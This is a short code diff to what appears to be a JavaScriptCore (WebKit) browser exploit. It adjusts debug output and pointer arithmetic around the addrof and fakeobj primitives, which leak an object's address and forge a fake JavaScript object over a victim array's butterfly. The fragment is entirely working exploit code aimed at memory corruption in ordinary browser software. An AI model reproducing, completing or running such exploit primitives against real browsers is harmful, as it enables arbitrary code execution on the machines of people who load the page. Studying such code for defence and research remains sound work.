@@ -560,7 +560,7 @@ var VM_PROT_EXECUTE = 0x4
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     
-    port.postMessage("[+] victim @"+addrof(victim));
+    port.postMessage("[+] victim @ "+ addrof(victim).toString());
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
@@ -571,9 +571,9 @@ var VM_PROT_EXECUTE = 0x4
 
     // create object having |victim| as butterfly.
     var containerAddr = addrof(container);
-    port.postMessage("[+] container @"+ containerAddr);
+    port.postMessage("[+] container @ "+ containerAddr.toString());
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr + new Int64(0x10));
+    var hax = fakeobj(Add(containerAddr,new Int64(0x10)));
     /*var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
